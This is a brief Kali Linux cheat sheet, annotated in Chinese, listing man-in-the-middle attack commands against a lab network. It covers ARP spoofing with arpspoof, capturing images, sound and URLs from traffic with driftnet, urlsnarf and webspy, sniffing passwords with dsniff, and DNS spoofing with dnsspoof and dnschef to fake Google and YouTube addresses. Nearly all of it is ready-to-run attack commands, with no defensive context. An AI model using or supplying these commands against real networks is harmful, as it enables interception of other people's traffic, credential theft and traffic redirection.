###ARP欺骗###

#########################################################

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 10.10.10.133 -r 10.10.10.1


#########################################################

###driftnet,urlsnarf,dsniff工具###

# 实时显示图片
 root@kali:~# driftnet -i eth0 
 # -a 不要在屏幕上显示图像，而是将其保存到一个临时目录中，并在标准输出上公布它们的名称。
 # -d 指定目录
 # -s 抓取声音
 # driftnet -i eth0 -a -d testdir -s

 # 抓取 URL
 # webspy -i eth0 10.10.10.133
 # urlsnarf -i eth0

 # 嗅探密码
 # -m：自动协议检测
 dsniff -i eth0 -m

###dns 欺骗###

#########################################################
dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts

 root@kali:~# dnschef --fakeip=10.10.10.2 --fakedomains=www.google.com,www.youtube.com --interface 10.10.10.131 -q
 root@kali:~# netstat -tulnp | grep 53

#########################################################





